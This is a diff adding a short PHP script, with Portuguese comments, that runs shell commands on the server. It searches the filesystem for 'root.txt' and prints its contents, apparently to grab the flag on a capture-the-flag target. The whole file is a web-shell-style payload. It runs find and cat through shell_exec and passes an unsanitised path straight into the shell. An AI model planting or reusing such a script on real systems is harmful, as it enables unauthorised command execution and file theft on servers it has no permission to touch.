@@ -1,0 +1,14 @@
+<?php
+// 1. Procurar o arquivo real e imprimir o caminho para conferência
+$caminho = shell_exec("find / -name root.txt 2>/dev/null");
+echo "Caminho encontrado: " . htmlspecialchars($caminho) . "<br>";
+
+// 2. Ler o conteúdo de forma bruta
+if (!empty($caminho)) {
+    echo "Conteúdo:<br><pre>";
+    echo htmlspecialchars(shell_exec("cat " . trim($caminho)));
+    echo "</pre>";
+} else {
+    echo "Arquivo 'root.txt' não encontrado pelo find.";
+}
+?>
